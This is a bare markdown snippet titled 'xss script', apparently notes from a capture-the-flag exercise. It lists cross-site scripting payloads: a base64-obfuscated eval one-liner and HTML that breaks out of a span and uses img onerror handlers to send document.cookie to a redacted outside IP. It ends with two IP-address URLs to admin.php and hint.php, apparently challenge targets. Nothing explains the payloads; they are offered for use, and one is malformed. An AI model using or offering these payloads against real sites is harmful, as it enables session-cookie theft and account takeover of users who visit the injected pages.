### xss script
```javascript
'eval(atob(\'' + btoa('window.location=\'http://---.---.---.---:----/\' + document.cookie') + '\'))'
```

```html
yelo</span><img src="http://---.---.---.---:----/ping">
yelo</span><img onerror="window.location = 'http://---.---.---.---:----/' + document.cookie">
yelo</span><img onerror="eval(btoa(('...'))">
```

- http://117.51.147.2/Ze02pQYLf5gGNyMn/admin.php
- http://139.199.107.193/hint.php
